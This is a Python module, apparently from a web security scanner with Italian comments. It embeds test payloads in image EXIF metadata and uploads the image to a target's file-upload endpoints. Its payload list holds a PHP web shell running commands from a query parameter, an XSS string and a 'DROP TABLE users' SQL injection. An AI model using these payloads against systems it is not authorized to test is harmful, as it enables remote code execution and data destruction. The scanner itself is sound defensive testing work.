"""
modules/upload/exiftool_runner.py  — gated: has_file_upload AND accepts_executable

Inietta payload nei metadati EXIF di immagini prima di caricarle.
Tecnica utile quando il server processa immagini con ImageMagick o librerie
che espongono metadati all'applicazione/log.

Output: reports/<service>/exiftool.json
"""

import os
import shutil
import tempfile

from modules.base_runner import BaseRunner, make_run_fn

_TARGET_URL = "http://localhost"
# Payload EXIF classici: injection nei campi Comment/Author
_EXIF_PAYLOADS = [
    ("Comment", "<?php system($_GET['cmd']); ?>"),
    ("Author", "<script>alert(1)</script>"),
    ("Comment", "'; DROP TABLE users; --"),
]
# File immagine minima valida (1x1 PNG)
_PNG_PIXEL = bytes([
    0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A,0x00,0x00,0x00,0x0D,
    0x49,0x48,0x44,0x52,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,
    0x08,0x02,0x00,0x00,0x00,0x90,0x77,0x53,0xDE,0x00,0x00,0x00,
    0x0C,0x49,0x44,0x41,0x54,0x08,0xD7,0x63,0xF8,0xCF,0xC0,0x00,
    0x00,0x00,0x02,0x00,0x01,0xE2,0x21,0xBC,0x33,0x00,0x00,0x00,
    0x00,0x49,0x45,0x4E,0x44,0xAE,0x42,0x60,0x82,
])


class ExiftoolRunner(BaseRunner):
    MODULE_NAME = "exiftool"

    def execute(self):
        upload_locs = self.stack.get("file_upload_locations", [])
        if not self.stack.get("has_file_upload") or not any(l.get("accepts_executable") for l in upload_locs):
            return "skipped", "skip: has_file_upload=False or no executable-accepting upload sink"
        if not self.tool_available("exiftool"):
            return "error", "exiftool not found in PATH"

        target_base = self.settings.get("target_url", _TARGET_URL).rstrip("/")
        upload_eps = [
            ep for ep in self.endpoints
            if ep["file"] in {loc["file"] for loc in upload_locs if loc.get("accepts_executable")}
        ]
        if not upload_eps:
            return "skipped", "skip: no endpoints mapped to executable-upload sinks"

        for ep in upload_eps:
            url = f"{target_base}{ep['path']}"
            param = next((p["name"] for p in ep.get("params", []) if p.get("type") == "file"), "file")
            self._test_exif(url, ep, param)

        return "completed", None

    def _test_exif(self, url: str, ep: dict, param: str):
        with tempfile.TemporaryDirectory() as tmpdir:
            for field, payload in _EXIF_PAYLOADS:
                img_path = os.path.join(tmpdir, "test.png")
                with open(img_path, "wb") as f:
                    f.write(_PNG_PIXEL)

                rc, _, _ = self.sh(
                    ["exiftool", f"-{field}={payload}", "-overwrite_original", img_path],
                    timeout=10,
                )
                if rc != 0:
                    continue

                rc2, stdout2, _ = self.sh(
                    ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                     "-F", f"{param}=@{img_path};filename=test.png",
                     url, "--max-time", str(self.timeout)],
                )
                if rc2 == 0 and stdout2.strip() in ("200", "201", "302"):
                    self.add_finding(
                        type_="file_upload",
                        file_=ep["file"],
                        line=ep["line"],
                        endpoint=ep["path"],
                        method=ep["method"],
                        confidence="low",
                        detail=f"exiftool: uploaded PNG with {field}={payload[:40]!r} → HTTP {stdout2.strip()}; verify server-side processing",
                        payload=payload,
                        requires_manual_review=True,
                    )


run = make_run_fn(ExiftoolRunner)
